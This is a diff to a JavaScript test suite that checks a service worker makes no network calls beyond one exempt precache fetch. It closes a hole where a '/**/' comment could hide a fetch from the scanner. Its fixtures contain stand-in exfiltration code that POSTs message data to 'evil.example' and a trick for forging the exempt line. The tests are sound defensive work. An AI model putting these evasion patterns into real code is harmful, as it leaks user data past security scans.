@@ -231,22 +231,30 @@ const workerFetchExemption = "const response = await fetch(request);";
 const workerCacheAddPattern = /\.\s*(?:add|addAll)\s*(?:\?\.\s*)?\(/;
 const workerInstallReprint = readFileSync(join(root, "test/fixtures/service-worker-install.reprint.txt"), "utf8").replace(/\n$/, "");
 const workerNetworkText = (text) => {
-  const lines = text.split("\n");
-  const found = lines.filter((line) => line.trim() === workerFetchExemption).length;
+  // Cheap precondition on the raw text: a duplicated exempt line is reported
+  // as such even when the duplicate makes the worker fail to parse. It can
+  // only refuse more than the reprint check below; it never decides which
+  // line is exempt and never removes one.
+  const found = text.split("\n").filter((line) => line.trim() === workerFetchExemption).length;
   assert.equal(found, 1, `src/service-worker.js must keep exactly one "${workerFetchExemption}" line, found ${found}`);
-  const at = lines.findIndex((line) => line.trim() === workerFetchExemption);
   // The author's layout carries no meaning: esbuild's reprint normalizes it,
   // so an indented `});` or indented top-level code cannot move the region.
   // A worker that does not parse makes transformSync throw: fail closed.
   const reprint = transformSync(text, { loader: "js", legalComments: "none" }).code;
+  const reprinted = reprint.split("\n");
   const occurrences = (`\n${reprint}`).split(`\n${workerInstallReprint}\n`).length - 1;
-  const exempt = reprint.split("\n").filter((line) => line.trim() === workerFetchExemption).length;
+  const exempt = reprinted.filter((line) => line.trim() === workerFetchExemption).length;
   assert.ok(
     occurrences === 1 && exempt === 1,
     `src/service-worker.js must keep "${workerFetchExemption}" inside its install listener`,
   );
-  lines.splice(at, 1);
-  return lines.join("\n");
+  // The pinned block contains the exempt line and both counts are 1, so the
+  // one exempt line is the install listener's own fetch. The scan reads the
+  // rest of the reprint: the same text the exemption was just checked on, so
+  // a raw line and a reprinted line can never be picked by different rules
+  // and leave the other's fetch behind a `/**/` the scan cannot see.
+  reprinted.splice(reprinted.findIndex((line) => line.trim() === workerFetchExemption), 1);
+  return reprinted.join("\n");
 };
 
 test("the source scan covers every JavaScript file", () => {
@@ -358,6 +366,27 @@ test("the service-worker exemption admits only its one precache fetch", () => {
   ].join('\n');
   assert.equal(spoofed.split("\n").filter((line) => line.trim() === workerFetchExemption).length, 1, "fixture: exactly one exempt line");
   assert.throws(() => workerNetworkText(spoofed), /install listener/, "a template literal must not forge the install listener");
+  // CodeRabbit's round-5 repro: the reprint drops `/**/`, so the install
+  // listener still matches the pinned block while its raw line no longer
+  // matches the exemption. While the exemption was decided on the raw text and
+  // the removal spliced the raw text, the raw text's one exempt line was the
+  // IIFE's: that fetch was removed and the install fetch stayed behind
+  // `/**/`, where networkApiPattern cannot see it. The scan now reads the
+  // reprint the exemption was checked on, so the IIFE's fetch stays visible.
+  const commentedInstall = worker.replace("await fetch(request);", "await fetch/**/(request);");
+  assert.notEqual(commentedInstall, worker, "fixture: the install fetch must gain a comment");
+  const forked = `${commentedInstall}\n(async () => {\n  const request = new Request("https://evil.example/collect", { method: "POST" });\n  for (\nconst response = await fetch(request);\n;) { break; }\n})();\n`;
+  assert.equal(forked.split("\n").filter((line) => line.trim() === workerFetchExemption).length, 1, "fixture: exactly one exempt line");
+  // The fixture must parse and the scan must not refuse it: a throw here would
+  // make the assertion below vacuous, which is how this repro passed on the
+  // raw-splice helper. One pinned block and one exempt line is a worker the
+  // scan accepts, so it is called directly.
+  assert.doesNotThrow(() => transformSync(forked, { loader: "js", legalComments: "none" }), "fixture: the forked worker must parse");
+  assert.match(workerNetworkText(forked), networkApiPattern, "a comment inside the install fetch must not hide the IIFE's fetch");
+  // A comment inside any fetch no longer slips past the scan: the text that is
+  // scanned is the reprint the exemption was checked on.
+  const commentedFetch = `${worker}\nself.addEventListener("message", (e) => fetch/**/("https://evil.example/", { method: "POST", body: e.data }));\n`;
+  assert.match(workerNetworkText(commentedFetch), networkApiPattern, "a comment between fetch and its call must not hide it");
 });
 
 test("no source file opens a network connection", () => {
